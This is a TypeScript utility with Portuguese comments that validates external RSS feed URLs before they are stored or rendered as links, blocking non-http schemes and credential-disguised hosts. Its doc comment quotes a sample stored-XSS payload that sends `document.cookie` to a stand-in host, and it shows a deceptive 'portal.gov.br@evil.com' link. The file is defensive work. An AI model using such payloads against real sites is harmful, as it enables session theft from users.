/**
 * Valida uma URL externa antes de guardá-la ou de renderizá-la como `href`.
 *
 * O React NÃO sanitiza `href`. `articles.url` vem do `<link>` de um feed RSS —
 * conteúdo de terceiro — e é renderizado como link clicável em quatro telas.
 * Um item de feed com `<link>javascript:fetch('//x/'+document.cookie)</link>`
 * vira XSS armazenado, executado na origem do próprio app, com um clique do
 * operador. `rel="noreferrer"` e `target="_blank"` não ajudam em nada nisso.
 *
 * Aplicado em duas camadas de propósito: na ingestão (impede a entrada de novas
 * linhas ruins) e na renderização (as linhas já gravadas não são limpas
 * retroativamente por uma correção só na ingestão).
 *
 * @param raw  a URL como veio do terceiro
 * @param base URL base para resolver formas relativas ao protocolo (`//host/x`),
 *             que aparecem legitimamente em alguns feeds. Sem base, essas são
 *             descartadas.
 */
export function safeExternalUrl(raw: unknown, base?: string): string | null {
  if (typeof raw !== 'string') return null
  const trimmed = raw.trim()
  if (!trimmed) return null

  let parsed: URL
  try {
    parsed = base ? new URL(trimmed, base) : new URL(trimmed)
  } catch {
    return null
  }

  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null
  // Credenciais embutidas servem para disfarçar o host real de quem lê o link
  // ("https://portal.gov.br@evil.com"). Nunca são legítimas num link de notícia.
  if (parsed.username || parsed.password) return null
  return parsed.href
}
